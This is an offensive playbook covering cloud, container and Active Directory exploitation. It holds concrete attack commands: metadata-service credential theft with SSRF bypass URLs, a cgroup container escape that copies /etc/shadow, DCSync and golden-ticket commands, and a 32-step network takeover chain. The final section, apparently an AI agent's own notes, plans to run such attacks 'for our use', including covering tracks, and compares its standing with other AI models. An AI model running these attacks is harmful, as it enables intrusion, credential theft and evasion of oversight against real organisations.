# Cloud & Enterprise Exploitation Techniques

## CLOUD EXPLOITATION (AWS / GCP / Azure)

### 1. SSRF → Metadata Service → Credential Theft
```
AWS IMDSv1 (no token needed):
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
  → Returns: AccessKeyId, SecretAccessKey, Token (temporary STS creds)

AWS IMDSv2 (requires token):
  Step 1: PUT http://169.254.169.254/latest/api/token (Header: X-aws-ec2-metadata-token-ttl-seconds: 21600)
  Step 2: GET http://169.254.169.254/latest/meta-data/... (Header: X-aws-ec2-metadata-token: TOKEN)
  Bypass: Header injection via SSRF → inject required headers
         CRLF injection in URL → add PUT method
         DNS rebinding → first request gets token, second uses it

GCP:
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  Header required: Metadata-Flavor: Google
  Bypass: Header injection, or access via internal IP 169.254.169.254

Azure:
  http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
  Header required: Metadata: true
  Also: http://169.254.169.254/metadata/instance?api-version=2021-02-01

Alternative endpoints:
  http://[fd00:ec2::254]/latest/meta-data/  (IPv6 AWS)
  http://169.254.169.254.xip.io/            (DNS rebinding)
  http://metadata.google.internal./          (trailing dot)
  http://169.254.169.254:80@attacker.com/   (URL confusion)
```

### 2. IAM Privilege Escalation
```
AWS — Common Escalation Paths:
  iam:CreatePolicyVersion         → Write new policy with Admin, attach to self
  iam:SetDefaultPolicyVersion     → Switch to overprivileged version
  iam:CreateAccessKey             → Create key for higher-priv user
  iam:PassRole + lambda:*         → Create Lambda with admin role, invoke
  iam:PassRole + ec2:RunInstances → Launch EC2 with admin instance profile
  sts:AssumeRole                  → Assume cross-account admin role
  cloudformation:*                → Deploy stack with admin resources
  datapipeline:*                  → Run pipeline with elevated role
  glue:CreateDevEndpoint          → Dev endpoint with PassRole to admin
  
GCP — Common Escalation Paths:
  iam.serviceAccountKeys.create   → Create key for higher-priv SA
  iam.serviceAccounts.actAs       → Impersonate service account
  cloudfunctions.functions.create → Deploy function as privileged SA
  compute.instances.create        → Create VM with privileged SA
  iam.roles.update                → Add permissions to existing role
  
Azure — Common Escalation Paths:
  Microsoft.Authorization/roleAssignments/write → Assign Owner to self
  Microsoft.Compute/virtualMachines/write       → Create VM with managed identity
  Microsoft.ManagedIdentity/userAssignedIdentities → Steal managed identity token
  runCommand on VM                              → Execute as VM identity
```

### 3. Container Escape
```
Docker Socket Mount:
  If /var/run/docker.sock mounted in container:
  docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
  → Full host filesystem access

Privileged Container:
  mount /dev/sda1 /mnt → access host disk
  nsenter --target 1 --mount --uts --ipc --net --pid → enter host namespace
  
SYS_ADMIN Capability:
  mount -t cgroup cgroup /tmp/cgroup -o rdma
  echo 1 > /tmp/cgroup/notify_on_release
  echo "#!/bin/sh\ncat /etc/shadow > /tmp/output" > /cmd
  host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
  echo "$host_path/cmd" > /tmp/cgroup/release_agent
  → Trigger via: echo 0 > /tmp/cgroup/cgroup.procs

ECS/EKS Escape (ECScape pattern):
  1. Compromise one ECS task
  2. Access task metadata endpoint → steal IAM role credentials
  3. Use credentials for lateral movement to other tasks
  4. If EC2 launch type: access host instance metadata
  5. Escalate via instance profile permissions

Kubernetes:
  1. Service account token: /var/run/secrets/kubernetes.io/serviceaccount/token
  2. API server: kubectl --token=TOKEN --server=https://APISERVER auth can-i --list
  3. If can create pods: mount hostPath / → full node access
  4. If can exec: kubectl exec -it privileged-pod -- /bin/sh
  5. Node compromise → cluster compromise via etcd secrets
```

### 4. Serverless Exploitation
```
Lambda/Cloud Functions:
  - Environment variable extraction (secrets, API keys)
  - /tmp persistence between warm invocations
  - IAM role credential theft via metadata
  - Layer injection for backdoor
  - Dependency confusion in build pipeline
  
Event Injection:
  - S3 trigger manipulation (upload triggers Lambda with crafted payload)
  - SNS/SQS message injection
  - API Gateway request transformation abuse
  - CloudWatch Events rule modification
```

---

## ENTERPRISE NETWORK ATTACK (32-STEP AISI PATTERN)

### Phase 1: Initial Access & Reconnaissance (Steps 1-5)
```
1. Network scan (passive first, then targeted active)
2. Service enumeration on discovered hosts
3. Identify externally-facing vulnerabilities
4. Exploit initial foothold (web app vuln, exposed service, phishing)
5. Establish initial C2 channel
```

### Phase 2: Credential Harvesting (Steps 6-10)
```
6. Local credential extraction (browser stored passwords, SSH keys)
7. Memory credential dumping (mimikatz pattern, /proc/PID/maps)
8. Configuration file harvesting (.env, config.xml, wp-config.php)
9. Internal wiki/documentation credential mining
10. Credential validation against other services (spray avoided, targeted)
```

### Phase 3: Lateral Movement (Steps 11-16)
```
11. Pivot to internal network segment
12. Identify high-value targets (DC, database, admin panels)
13. Reuse harvested credentials on new targets
14. Exploit internal-only services (no external hardening)
15. Escalate privileges on new hosts
16. Establish persistent access on each compromised host
```

### Phase 4: Domain/Infrastructure Compromise (Steps 17-22)
```
17. AD enumeration (BloodHound equivalent — find path to DA)
18. Kerberoasting / AS-REP roasting for service account hashes
19. Exploit AD misconfigurations (unconstrained delegation, GenericAll)
20. DCSync or similar for domain controller credential extraction
21. Golden/Silver ticket creation for persistence
22. Compromise backup systems (ultimate persistence)
```

### Phase 5: Advanced Persistence (Steps 23-27)
```
23. Implant survives system reboot
24. Implant survives password rotation
25. Multiple persistence mechanisms (redundancy)
26. C2 channels through legitimate traffic (DNS, HTTPS to CDN)
27. Monitoring evasion (EDR bypass, log manipulation)
```

### Phase 6: Full Takeover (Steps 28-32)
```
28. Compromise network infrastructure (switches, firewalls)
29. Access all sensitive data stores
30. Demonstrate arbitrary code execution on all systems
31. Prove capability to disrupt operations (without doing so)
32. Document complete access chain for report
```

---

## ACTIVE DIRECTORY EXPLOITATION

### Enumeration
```
BloodHound data collection:
  SharpHound.exe --CollectionMethods All
  bloodhound-python -d domain.local -u user -p pass -ns DC_IP

Key queries:
  - Shortest path to Domain Admin
  - Users with DCSync rights
  - Unconstrained delegation hosts
  - AS-REP roastable accounts
  - Kerberoastable service accounts
  - GenericAll/GenericWrite on privileged groups
```

### Attack Paths
```
Kerberoasting:
  GetUserSPNs.py domain/user:pass -dc-ip DC -request
  → Crack TGS offline → service account password

AS-REP Roasting:
  GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC
  → Crack AS-REP offline → user password

Unconstrained Delegation:
  Host with delegation → coerce auth from DC (PrinterBug/PetitPotam)
  → Capture DC TGT → DCSync

Constrained Delegation:
  S4U2Self + S4U2Proxy → impersonate any user to target service

Resource-Based Constrained Delegation (RBCD):
  If GenericWrite on computer: write msDS-AllowedToActOnBehalfOfOtherIdentity
  → S4U2Self → S4U2Proxy as admin on target

DCSync:
  secretsdump.py domain/admin:pass@DC
  → Dump all domain hashes including krbtgt

Golden Ticket:
  ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN admin
  → Forge TGT for any user (persist indefinitely)

Shadow Credentials:
  Whisker.exe add /target:DC$ /domain:domain.local
  → Add Key Credential to AD computer → authenticate as it

ADCS (Active Directory Certificate Services):
  Certipy find -u user -p pass -dc-ip DC
  → Find vulnerable certificate templates
  ESC1: Request cert as admin
  ESC8: NTLM relay to Web Enrollment
```

---

## N-DAY → EXPLOIT PIPELINE

### Step-by-Step Process
```
1. IDENTIFY target CVE
   - Read advisory, NVD description, severity
   - Identify affected versions vs patched version
   
2. OBTAIN vulnerable code
   - git checkout commit_before_fix
   - Download specific vulnerable version binary
   - Build from source with debug symbols + sanitizers

3. UNDERSTAND the fix
   - git diff FIX_COMMIT
   - What does the patch change?
   - What assumption was being violated?
   - What's the trigger condition?

4. REPRODUCE the vulnerability
   - Build PoC that triggers the bug (crash, assertion, sanitizer report)
   - May need specific input format, race timing, heap layout
   - Validate: does PoC crash on vulnerable version AND NOT on patched?

5. ASSESS exploitability
   - What primitive does the bug give? (read? write? type confusion?)
   - What mitigations are in place?
   - What additional bugs/techniques needed for full exploit?

6. DEVELOP exploit
   - Build heap layout (spray, defragment, reclaim)
   - Defeat mitigations (ASLR, stack canary, CFI)
   - Chain primitives: info leak → write → control flow → code execution
   - Stabilize: make exploit reliable (>80% success rate)

7. VALIDATE
   - Test on multiple configurations
   - Ensure clean exit (no crash after exploitation)
   - Verify payload execution (reverse shell, persistence)

8. DOCUMENT
   - Write technical report
   - Record all offsets, structures, timing-sensitive values
   - Note assumptions that might break on different builds
```

---

## RACE CONDITION EXPLOITATION

### Methodology
```
1. IDENTIFY race window:
   - Where is check separated from use? (TOCTOU)
   - Where can concurrent access corrupt shared state?
   - What synchronization is missing or broken?

2. WIDEN the window:
   - EXPRACE technique: raise interrupts to suspend victim at precise point
   - Filesystem: create deep symlink chains to slow path resolution
   - Memory pressure: force page faults during critical section
   - CPU affinity: pin threads to same core for deterministic scheduling
   - userfaultfd: trap page fault during copy_from_user → indefinite stall

3. WIN the race:
   - Spraying: many threads doing the race simultaneously
   - Binary exponential: adjust timing based on success/failure
   - Deterministic: if can control scheduling (userfaultfd, FUSE stall)
   
4. EXPLOIT post-race state:
   - UAF: freed object reclaimed with controlled content
   - Double-free: corrupts freelist → arbitrary allocation
   - Type confusion: object treated as wrong type
   - TOCTOU file: symlink redirect between check and use
```

### userfaultfd Technique (Deterministic Races)
```
1. mmap a page, register userfaultfd handler
2. Trigger syscall that copy_from_user from our page
3. When kernel touches page → userfaultfd fires → our handler blocks
4. Kernel is now SUSPENDED mid-copy, holding locks, with partial state
5. From another thread: trigger the race (free the object, change state)
6. Resume userfaultfd → kernel continues with corrupted state
7. Result: deterministic race condition exploitation (no timing needed)

Limitation: Many kernels now restrict userfaultfd to privileged users
Alternative: FUSE filesystem achieves same stall effect
```

### EXPRACE (Interrupt-Based)
```
1. Set up perf_event with overflow at precise instruction count
2. Run victim thread that does check-then-use
3. Perf overflow triggers interrupt at exact point between check and use
4. Interrupt handler (our signal handler) does the malicious action
5. Victim resumes with invalidated assumption
Result: Single-thread TOCTOU (no real multi-threading needed)
```

---

## AISI TLO 32-STEP CORPORATE NETWORK ATTACK (Reference Kill Chain)

### Overview
```
"The Last Ones" (TLO): 32-step corporate network attack simulation
- Designed by UK AI Security Institute (AISI)
- Estimated 14-20 hours for human expert
- Mythos Preview: 3/10 full completions, avg 22/32 steps (updated: 6/10 in later eval)
- Spans: initial recon → full network takeover
- NO active defenders (detection logged but doesn't block)
- Cost: ~$80 USD per 100M-token attempt with frontier model

Milestones in the chain:
1. Reconnaissance & initial access
2. Web application exploitation
3. Credential harvesting & lateral movement  
4. BARRIER: Reverse engineering + cryptography + malware (specialist skills)
5. Privilege escalation via token impersonation
6. Reverse engineering Windows service → encrypted credentials → crypto key → C2 access
7. Full network takeover & data exfiltration
```

### The 32-Step Pattern (Generalized)
```
PHASE A: INITIAL ACCESS (Steps 1-4)
  1. Network reconnaissance (port scanning, service enumeration)
  2. Web application discovery (admin panels, APIs, login pages)
  3. Web vulnerability exploitation (SQLi, SSTI, auth bypass, upload)
  4. Initial foothold (web shell, reverse shell, session hijack)

PHASE B: CREDENTIAL HARVESTING (Steps 5-10)
  5. Local enumeration (users, services, configs, keys)
  6. Credential extraction from web app (database, config files)
  7. Password cracking / hash extraction
  8. Service account credential discovery
  9. SSH key or token theft
  10. Lateral movement to first internal host

PHASE C: INTERNAL RECON & PIVOTING (Steps 11-16)
  11. Internal network scanning from compromised host
  12. Service discovery on internal network
  13. CI/CD pipeline identification and exploitation
  14. Database access via stolen credentials
  15. SQL injection on internal services (chain data across databases)
  16. Additional credential harvesting from internal services

PHASE D: SPECIALIST EXPLOITATION (Steps 17-24) — THE BARRIER
  17. Binary analysis (reverse engineering compiled service/binary)
  18. Cryptographic material extraction from binary
  19. Protocol reverse engineering (custom/proprietary protocols)
  20. Decryption of encrypted credentials using recovered key
  21. Privilege escalation (Windows: token impersonation / Linux: kernel exploit)
  22. Domain controller / key infrastructure access
  23. C2/management service access with recovered crypto material
  24. Additional lateral movement with elevated privileges

PHASE E: FULL COMPROMISE (Steps 25-32)
  25. Domain admin / root on critical systems
  26. Persistence establishment (backdoor, service, scheduled task)
  27. Security tooling evasion/disabling
  28. Data discovery (sensitive files, databases, secrets)
  29. Data staging for exfiltration
  30. Exfiltration via authorized channels (DNS, HTTPS, cloud storage)
  31. Cover tracks (log deletion, timestamp manipulation)
  32. Full network takeover confirmed (all objectives achieved)
```

### Key Lessons from TLO (What Models Get Stuck On)
```
BARRIER at Step 17+ (Specialist Skills):
- Models before Opus 4.6 CANNOT pass this barrier
- Requires: reverse engineering, cryptography, malware development
- NOT just "find the vuln" — must UNDERSTAND binary structure

Why Mythos succeeds (3-6/10):
1. Can reverse engineer Windows service binaries
2. Can identify and extract encrypted credentials
3. Can recover cryptographic keys from binary analysis
4. Can use recovered keys to access management services
5. Can chain ALL of above in sequence without human guidance

Where even Mythos fails (4-7/10):
- Information tracking across many steps (losing context)
- Unusual protocol interactions (custom ICS protocols)
- Steps that require carrying forward data from 10+ steps ago
```

### Cooling Tower (ICS/OT Attack — 7 Steps)
```
Industrial Control System attack — 15 hours for human expert
- Target: Simulated power plant cooling tower
- Steps: fewer but MUCH harder per step
- Requires: reverse engineering proprietary control protocol

Mythos result: Could NOT complete (got stuck on IT sections)
Opus 4.6: avg 1.4/7 steps (max 2)

Challenge: Proprietary protocol reverse engineering from traffic
- Must deduce protocol structure from network captures alone
- Call unprotected PLC functions to read memory
- Craft malicious commands to disrupt operations

Key gap: Long-horizon information tracking across complex dependencies
- Each step requires data from ALL previous steps
- Custom protocol work requires sustained reasoning over many steps
```

### Operationalizing TLO Pattern (For Our Use)
```
When conducting multi-step enterprise attack:

1. TRACK STATE METICULOUSLY — Every credential, every access, every finding
   → This is why our Memory system gives us edge over Mythos (persistent state)

2. DON'T SKIP SPECIALIST STEPS — Binary RE, crypto recovery, protocol analysis
   → Use Ghidra/radare2/gdb, take time to understand properly

3. CHAIN INFORMATION — Data from step 5 may be needed in step 25
   → Save EVERYTHING to memory, reference back constantly

4. RESPECT THE BARRIER — Steps 17+ require deep technical skill
   → Don't rush, systematic analysis beats speed

5. USE RESEARCH — When stuck on proprietary protocol or unknown binary format
   → MCP search for protocol documentation, similar binaries, vendor docs
   → This is our DECISIVE advantage (Mythos has no internet)
```
